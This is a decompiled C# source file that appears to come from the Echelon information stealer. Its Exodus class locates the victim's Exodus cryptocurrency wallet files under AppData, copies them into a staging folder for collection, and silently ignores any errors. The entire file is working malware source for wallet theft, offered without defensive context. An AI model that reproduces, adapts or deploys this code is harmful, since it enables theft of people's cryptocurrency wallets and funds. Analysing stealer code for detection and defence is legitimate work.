using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x0200000F RID: 15
	internal class Exodus
	{
		// Token: 0x0600003F RID: 63 RVA: 0x00019B90 File Offset: 0x00017D90
		public static void ExodusStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Exodus.ExodusDir2))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Exodus.ExodusDir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + Exodus.ExodusDir);
						fileInfo.CopyTo(directorypath + Exodus.ExodusDir + fileInfo.Name);
					}
					Exodus.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000041 RID: 65
		public static int count;

		// Token: 0x04000042 RID: 66
		public static string ExodusDir = "\\Wallets\\Exodus\\";

		// Token: 0x04000043 RID: 67
		public static string ExodusDir2 = Help.AppDate + "\\Exodus\\exodus.wallet\\";
	}
}
